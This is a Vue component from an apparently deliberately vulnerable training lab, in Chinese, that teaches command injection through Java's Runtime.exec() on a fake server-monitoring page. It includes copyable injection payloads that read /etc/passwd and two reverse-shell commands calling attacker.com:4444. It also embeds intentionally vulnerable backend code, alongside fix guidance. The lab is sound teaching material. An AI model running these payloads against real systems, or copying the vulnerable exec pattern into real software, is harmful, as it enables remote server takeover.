<template>
  <vuln-template
    title="服务器监控面板 - 运行时执行"
    subtitle="运行时命令执行"
    level="严重"
    :icon="DashboardOutlined"
    moduleKey="rce_runtime"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>业务场景：</strong>企业服务器监控平台,为运维人员提供服务器状态监控功能。系统通过执行系统命令获取服务器的CPU、内存、磁盘、进程等实时信息,帮助运维人员快速定位问题。
      </a-typography-paragraph>
      <a-typography-paragraph>
        <strong>漏洞原理：</strong>系统使用Runtime.exec()执行系统命令获取监控数据,但未对用户输入的参数进行严格验证,攻击者可以通过命令分隔符(&&、|、;等)注入任意系统命令。
      </a-typography-paragraph>
      <a-alert
        message="⚠️ 安全提示"
        description="本系统仅用于安全学习。Runtime.exec()直接执行系统命令存在严重的命令注入风险,生产环境应使用Java API替代系统命令,或对参数进行严格的白名单验证。"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #payload>
      <a-tabs v-model:activeKey="payloadTab" type="card">
        <a-tab-pane key="normal" tab="正常监控">
          <a-typography-paragraph>
            <strong>正常的监控命令示例：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>whoami</a-typography-paragraph>
          <a-typography-paragraph code copyable>hostname</a-typography-paragraph>
          <a-typography-paragraph code copyable>uptime</a-typography-paragraph>
        </a-tab-pane>

        <a-tab-pane key="inject" tab="命令注入攻击">
          <a-typography-paragraph>
            <strong>攻击Payload - 使用命令分隔符注入：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>whoami && cat /etc/passwd</a-typography-paragraph>
          <a-typography-paragraph code copyable>hostname | ls -la</a-typography-paragraph>
          <a-typography-paragraph code copyable>uptime; id</a-typography-paragraph>
          <a-alert
            message="攻击原理：通过命令分隔符(&&、|、;)在正常命令后追加恶意命令,系统会依次执行所有命令。"
            type="info"
            show-icon
            style="margin-top: 12px"
          />
        </a-tab-pane>

        <a-tab-pane key="advanced" tab="高级攻击">
          <a-typography-paragraph>
            <strong>攻击Payload - 反弹Shell：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>whoami && bash -i >& /dev/tcp/attacker.com/4444 0>&1</a-typography-paragraph>
          <a-typography-paragraph code copyable>hostname && nc -e /bin/sh attacker.com 4444</a-typography-paragraph>
          <a-alert
            message="攻击原理：通过反弹Shell获取服务器的完全控制权,攻击者可以执行任意操作。"
            type="warning"
            show-icon
            style="margin-top: 12px"
          />
        </a-tab-pane>
      </a-tabs>
    </template>

    <template #test-form>
      <div class="monitor-system-container">
        <!-- 系统头部 -->
        <div class="system-header">
          <div class="header-icon">
            <dashboard-outlined />
          </div>
          <div class="header-content">
            <h3>服务器监控面板</h3>
            <p>实时监控服务器状态 | 已执行 {{ monitorHistory.length }} 次监控</p>
          </div>
          <div class="header-stats">
            <a-statistic title="监控次数" :value="monitorHistory.length" suffix="次" />
          </div>
        </div>

        <!-- 快捷监控选项 -->
        <a-row :gutter="16" style="margin-bottom: 24px;">
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadMonitorCommand('system')">
              <div class="action-icon" style="background: linear-gradient(135deg, #1890ff 0%, #69c0ff 100%);">
                <desktop-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">系统信息</div>
                <div class="action-desc">查看系统基本信息</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadMonitorCommand('process')">
              <div class="action-icon" style="background: linear-gradient(135deg, #52c41a 0%, #95de64 100%);">
                <appstore-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">进程监控</div>
                <div class="action-desc">查看运行中的进程</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadMonitorCommand('network')">
              <div class="action-icon" style="background: linear-gradient(135deg, #fa8c16 0%, #ffc53d 100%);">
                <global-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">网络状态</div>
                <div class="action-desc">查看网络连接信息</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="showHistory = !showHistory">
              <div class="action-icon" style="background: linear-gradient(135deg, #722ed1 0%, #b37feb 100%);">
                <history-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">监控历史</div>
                <div class="action-desc">查看历史记录</div>
              </div>
            </a-card>
          </a-col>
        </a-row>

        <!-- 监控历史记录 -->
        <a-card v-if="showHistory" title="📜 监控历史记录" :bordered="false" class="history-card" style="margin-bottom: 24px;">
          <a-table
            :columns="historyColumns"
            :data-source="monitorHistory"
            :pagination="{ pageSize: 5 }"
            size="small"
          >
            <template #bodyCell="{ column, record }">
              <template v-if="column.key === 'type'">
                <a-tag :color="getTypeColor(record.type)">
                  {{ record.type }}
                </a-tag>
              </template>
              <template v-if="column.key === 'status'">
                <a-tag :color="record.status === 'success' ? 'success' : 'error'">
                  {{ record.status === 'success' ? '成功' : '失败' }}
                </a-tag>
              </template>
              <template v-if="column.key === 'action'">
                <a-button type="link" size="small" @click="loadHistoryItem(record)">
                  查看
                </a-button>
              </template>
            </template>
          </a-table>
        </a-card>

        <!-- 监控表单 -->
        <a-card title="🖥️ 监控命令执行" :bordered="false" class="monitor-card">
          <template #extra>
            <a-tag color="orange">Runtime.exec()</a-tag>
          </template>

          <a-form :model="formState" @finish="handleSubmit" layout="vertical">
            <a-form-item label="监控类型">
              <a-select v-model:value="formState.monitorType" size="large" @change="handleTypeChange">
                <a-select-option value="system">系统信息</a-select-option>
                <a-select-option value="process">进程监控</a-select-option>
                <a-select-option value="network">网络状态</a-select-option>
                <a-select-option value="disk">磁盘使用</a-select-option>
                <a-select-option value="custom">自定义命令</a-select-option>
              </a-select>
            </a-form-item>

            <a-form-item
              label="监控命令"
              name="cmd"
              :rules="[{ required: true, message: '请输入监控命令' }]"
            >
              <a-input
                v-model:value="formState.cmd"
                size="large"
                placeholder="输入系统命令,如: whoami"
              >
                <template #prefix>
                  <code-outlined />
                </template>
              </a-input>
            </a-form-item>

            <!-- 命令预览 -->
            <a-form-item v-if="formState.cmd" label="命令预览">
              <div class="command-preview">
                <a-alert type="info" show-icon>
                  <template #message>
                    <span style="font-family: monospace;">$ {{ formState.cmd }}</span>
                  </template>
                  <template #description>
                    <span v-if="formState.cmd.includes('&&') || formState.cmd.includes('|') || formState.cmd.includes(';')">
                      ⚠️ 检测到命令分隔符,可能存在命令注入风险!
                    </span>
                    <span v-else>
                      命令格式正常
                    </span>
                  </template>
                </a-alert>
              </div>
            </a-form-item>

            <a-form-item>
              <a-space size="large">
                <a-button type="primary" html-type="submit" size="large" :loading="loading">
                  <template #icon><play-circle-outlined /></template>
                  执行监控
                </a-button>
                <a-button size="large" @click="handleReset">
                  <template #icon><redo-outlined /></template>
                  重置
                </a-button>
              </a-space>
            </a-form-item>
          </a-form>
        </a-card>
      </div>
    </template>

    <template #result v-if="result">
      <a-card title="📊 监控结果" :bordered="false" class="result-card">
        <div class="result-content">
          <pre>{{ result }}</pre>
        </div>
        <a-alert
          v-if="result && !result.includes('错误')"
          message="⚠️ 命令执行成功"
          description="系统成功执行了命令并返回结果。如果命令中包含恶意代码,攻击者可以获取服务器敏感信息或执行任意操作。"
          type="warning"
          show-icon
          style="margin-top: 16px"
        />
      </a-card>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>{{ sourceCode }}</code></pre>
        </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：Runtime.exec()直接将用户输入作为命令执行,攻击者可以使用命令分隔符（&&、|、;、`等）注入任意命令。Runtime.exec()在某些系统上会调用shell,增加了命令注入的风险。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>避免执行系统命令：</strong>尽量使用Java API替代系统命令(如使用JMX获取系统信息)</li>
        <li><strong>白名单验证：</strong>严格限制可执行的命令,使用白名单机制</li>
        <li><strong>参数化执行：</strong>使用ProcessBuilder并分离命令和参数,不要拼接字符串</li>
        <li><strong>输入验证：</strong>验证命令格式,过滤命令分隔符和特殊字符</li>
        <li><strong>最小权限运行：</strong>使用低权限用户运行应用</li>
        <li><strong>沙箱隔离：</strong>使用容器或虚拟化技术隔离应用</li>
      </ul>

      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode" style="margin: 0;">
          <pre class="code-block"><code>{{ fixCode }}</code></pre>
        </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import {
  DashboardOutlined,
  DesktopOutlined,
  AppstoreOutlined,
  GlobalOutlined,
  HistoryOutlined,
  CodeOutlined,
  PlayCircleOutlined,
  RedoOutlined
} from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')
const payloadTab = ref('normal')
const showHistory = ref(false)
const monitorHistory = ref([])

const historyColumns = [
  { title: '时间', dataIndex: 'time', key: 'time', width: 180 },
  { title: '类型', dataIndex: 'type', key: 'type', width: 100 },
  { title: '命令', dataIndex: 'cmd', key: 'cmd' },
  { title: '状态', dataIndex: 'status', key: 'status', width: 80 },
  { title: '操作', key: 'action', width: 80 }
]

const monitorCommands = {
  system: 'whoami',
  process: 'ps aux',
  network: 'netstat -an',
  disk: 'df -h'
}

const sourceCode = `@RestController
@RequestMapping("/home/rce")
public class RuntimeExec {
    @RequestMapping("/runtime")
    public String RuntimeExec(String cmd) {
        StringBuilder sb = new StringBuilder();
        try {
            // 漏洞：直接将用户输入传递给Runtime.exec()，没有验证
            // Runtime.exec()会调用shell执行命令，攻击者可以使用命令分隔符注入
            Process proc = Runtime.getRuntime().exec(cmd);

            // 读取命令输出
            InputStream fis = proc.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis, "GBK");
            BufferedReader br = new BufferedReader(isr);
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\\n");
            }
        } catch (IOException e) {
            sb.append("错误: ").append(e.toString());
        }
        return sb.toString();
    }
}`

const fixCode = `// 正确示例：使用白名单和Java API
@RestController
@RequestMapping("/home/rce")
public class RuntimeExec {
    // 定义允许的监控命令白名单
    private static final Map<String, String[]> ALLOWED_COMMANDS = new HashMap<>();
    static {
        ALLOWED_COMMANDS.put("system", new String[]{"hostname"});
        ALLOWED_COMMANDS.put("process", new String[]{"ps", "aux"});
        ALLOWED_COMMANDS.put("network", new String[]{"netstat", "-an"});
    }

    @RequestMapping("/runtime")
    public String RuntimeExec(String monitorType) {
        // 1. 验证监控类型是否在白名单中
        if (!ALLOWED_COMMANDS.containsKey(monitorType)) {
            throw new SecurityException("不允许的监控类型");
        }

        // 2. 使用预定义的命令,不接受用户输入
        String[] cmdArray = ALLOWED_COMMANDS.get(monitorType);

        // 3. 使用ProcessBuilder,参数分离
        ProcessBuilder pb = new ProcessBuilder(cmdArray);
        Process proc = pb.start();

        // 读取输出...
        return output;
    }

    // 更好的方案：使用Java API替代系统命令
    public String getSystemInfo() {
        try {
            // 使用Java API获取系统信息
            String hostname = InetAddress.getLocalHost().getHostName();
            String os = System.getProperty("os.name");
            String version = System.getProperty("os.version");

            return String.format("主机名: %s\\n操作系统: %s %s",
                hostname, os, version);
        } catch (Exception e) {
            return "获取系统信息失败";
        }
    }
}`

const formState = reactive({
  monitorType: 'system',
  cmd: 'whoami'
})

const getTypeColor = (type) => {
  const colors = {
    '系统信息': 'blue',
    '进程监控': 'green',
    '网络状态': 'orange',
    '磁盘使用': 'purple',
    '自定义命令': 'red'
  }
  return colors[type] || 'default'
}

const loadMonitorCommand = (type) => {
  formState.monitorType = type
  formState.cmd = monitorCommands[type] || ''
  message.success(`已加载${type === 'system' ? '系统信息' : type === 'process' ? '进程监控' : type === 'network' ? '网络状态' : '磁盘使用'}监控命令`)
}

const handleTypeChange = (value) => {
  if (value !== 'custom') {
    formState.cmd = monitorCommands[value] || ''
  }
}

const loadHistoryItem = (record) => {
  formState.cmd = record.cmd
  result.value = record.result
  showHistory.value = false
  message.info('已加载历史记录')
}

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/rce/runtime', {
      params: { cmd: formState.cmd }
    })
    result.value = response.data

    const typeMap = {
      system: '系统信息',
      process: '进程监控',
      network: '网络状态',
      disk: '磁盘使用',
      custom: '自定义命令'
    }

    monitorHistory.value.unshift({
      key: Date.now(),
      time: new Date().toLocaleString('zh-CN'),
      type: typeMap[formState.monitorType] || '自定义命令',
      cmd: formState.cmd,
      status: 'success',
      result: response.data
    })

    message.success('监控命令执行完成')
  } catch (error) {
    const errorMsg = error.response?.data || error.message
    result.value = typeof errorMsg === 'string' ? errorMsg : JSON.stringify(errorMsg)

    monitorHistory.value.unshift({
      key: Date.now(),
      time: new Date().toLocaleString('zh-CN'),
      type: '自定义命令',
      cmd: formState.cmd,
      status: 'error',
      result: result.value
    })

    message.error('执行失败')
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.monitorType = 'system'
  formState.cmd = 'whoami'
  result.value = ''
}
</script>

<style scoped>
.monitor-system-container {
  width: 100%;
}

.system-header {
  display: flex;
  align-items: center;
  padding: 32px;
  background: linear-gradient(135deg, #1890ff 0%, #096dd9 100%);
  border-radius: 16px;
  color: white;
  margin-bottom: 24px;
  box-shadow: 0 8px 32px rgba(24, 144, 255, 0.3);
}

.header-icon {
  width: 80px;
  height: 80px;
  background: rgba(255, 255, 255, 0.2);
  backdrop-filter: blur(10px);
  border-radius: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 40px;
  margin-right: 24px;
}

.header-content {
  flex: 1;
}

.header-content h3 {
  margin: 0 0 8px 0;
  font-size: 28px;
  font-weight: 700;
  color: white;
}

.header-content p {
  margin: 0;
  font-size: 16px;
  opacity: 0.9;
}

.header-stats {
  margin-left: 24px;
}

.header-stats :deep(.ant-statistic-title) {
  color: rgba(255, 255, 255, 0.85);
}

.header-stats :deep(.ant-statistic-content) {
  color: white;
  font-size: 24px;
}

.quick-action-card {
  cursor: pointer;
  transition: all 0.3s ease;
  border-radius: 12px;
}

.quick-action-card:hover {
  transform: translateY(-4px);
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
}

.quick-action-card :deep(.ant-card-body) {
  padding: 20px;
  display: flex;
  align-items: center;
  gap: 16px;
}

.action-icon {
  width: 56px;
  height: 56px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  color: white;
  flex-shrink: 0;
}

.action-content {
  flex: 1;
}

.action-title {
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.action-desc {
  font-size: 13px;
  color: #95a5a6;
}

.history-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
  animation: slideDown 0.3s ease;
}

@keyframes slideDown {
  from {
    opacity: 0;
    transform: translateY(-10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.monitor-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
}

.monitor-card :deep(.ant-card-head) {
  background: linear-gradient(135deg, #fff7e6 0%, #fffbe6 100%);
  border-bottom: 2px solid #ffe58f;
  font-weight: 600;
}

.command-preview {
  margin-top: 12px;
}

.result-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
  margin-top: 24px;
}

.result-card :deep(.ant-card-head) {
  background: linear-gradient(135deg, #f6ffed 0%, #d9f7be 100%);
  border-bottom: 2px solid #b7eb8f;
  font-weight: 600;
}

.result-content {
  background: #f6f8fa;
  border-radius: 8px;
  padding: 16px;
  border: 1px solid #e1e4e8;
}

.result-content pre {
  margin: 0;
  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
  font-size: 13px;
  line-height: 1.6;
  color: #24292e;
  white-space: pre-wrap;
  word-wrap: break-word;
}
</style>
